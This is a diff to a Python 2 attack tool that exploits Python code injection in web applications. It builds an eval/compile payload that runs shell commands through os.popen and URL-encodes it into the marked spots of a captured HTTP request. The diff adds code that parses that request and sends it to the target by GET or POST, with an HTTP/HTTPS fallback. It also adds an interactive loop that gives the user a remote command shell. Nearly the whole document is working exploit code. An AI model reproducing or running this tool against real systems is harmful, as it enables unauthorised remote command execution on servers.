@@ -10,6 +10,22 @@
 
 import requests, re, optparse, urllib, os
 
+#Taken from http://stackoverflow.com/questions/2115410/does-python-have-a-module-for-parsing-http-requests-and-responses
+from BaseHTTPServer import BaseHTTPRequestHandler
+from StringIO import StringIO
+
+class HTTPRequest(BaseHTTPRequestHandler):
+    def __init__(self, request_text):
+        self.rfile = StringIO(request_text)
+        self.raw_requestline = self.rfile.readline()
+        self.error_code = self.error_message = None
+        self.parse_request()
+
+    def send_error(self, code, message):
+        self.error_code = code
+        self.error_message = message
+
+
 
 def parse_url(command,user_url,user_param=None):
     print user_param
@@ -37,12 +53,25 @@ def parse_request(command,filename,user_param=None):
         insert = '''eval(compile("""for x in range(1):\\n import os\\n print("-"*50)\\n os.popen(r'%s').read()""",'PyCodeInjectionShell','single'))''' % command
         encoded = urllib.quote(insert)
         request1 = file.read()
+        #req_obj = HTTPRequest(request1)      
+
         #print request1
         acceptline = re.search('Accept:.*',request1)
         #print str(acceptline.group(0))
         updated = re.sub("\*",encoded, request1)
-        updated2 = re.sub('Accept:.*',str(acceptline.group(0)), updated)
-        print updated2
+        updated2 = re.sub('Accept:.*',str(acceptline.group(0)), updated)        
+        req_obj = HTTPRequest(updated2)  
+        #print updated2
+        url = '%s%s' % (req_obj.headers['host'],req_obj.path)
+        if req_obj.command == "GET":
+            #print url
+            #print req_obj.headers
+            return url,req_obj.headers
+        elif req_obj.command == "POST":
+            content_len = int(req_obj.headers.getheader('content-length', 0))
+            post_body = req_obj.rfile.read(content_len)
+            
+            return url,req_obj.headers,post_body
 
 
 def select_command(user_url,user_param=None):
@@ -70,15 +99,35 @@ def select_command(user_url,user_param=None):
     print command_output.replace('\\n','\n')
     # print command_output
 
-def send_request(url,command,body=None):
-    response = requests.get(url)
+def send_request(url,command,headers=None,data=None):
+    #print headers
+    if 'http' not in url:        
+        try:
+            http_url = 'http://%s' % url
+            if (data):
+                response = requests.post(http_url, headers=headers, data=data)
+            else:
+                response = requests.get(http_url, headers=headers)
+        except Exception as error:
+            print error
+            try:
+                https_url = 'https://%s' % url
+                if (data):
+                    response = requests.post(https_url, headers=headers, data=data)
+                else:
+                    response = requests.get(https_url, headers=headers)
+            except Exception as error:
+                print error
+    else:
+        response = requests.get(url, headers=headers)
     #print response.headers
-    print response.content
-    match = re.search('([--------------------------------------------------][\n])(.*)',response.content)
+    #print response.content
+    match = re.search('([----------][\n])(.*)',response.content)
     command_output = str(match.group(0))
     print '\n\n{}\nOUTPUT OF: {}\n{}\n'.format('-'*30,command,'-'*30)
     print command_output.replace('\\n','\n').replace('\\t','\t')
     # print command_output
+
 
 
 # Ripped from https://raw.githubusercontent.com/sqlmapproject/sqlmap/044f05e772d0787489bdf7bc220a5dfc76714b1d/lib/core/common.py
@@ -157,9 +206,13 @@ if __name__ == '__main__':
 
     if (options.request):
         checkFile(options.request)
-        parsed_request = parse_request(options.cmd,options.request,options.parameter)
-        #send_request(url,options.cmd)
-        
+        parsed_url,headers,data = parse_request(options.cmd,options.request,options.parameter)
+        send_request(parsed_url,options.cmd,headers,data)
+        if (options.interactive):            
+            while True:                
+                new_cmd = raw_input("Command:")
+                parsed_url,headers,data = parse_request(new_cmd,options.request,options.parameter)
+                send_request(parsed_url,options.cmd,headers,data)
 
 
 
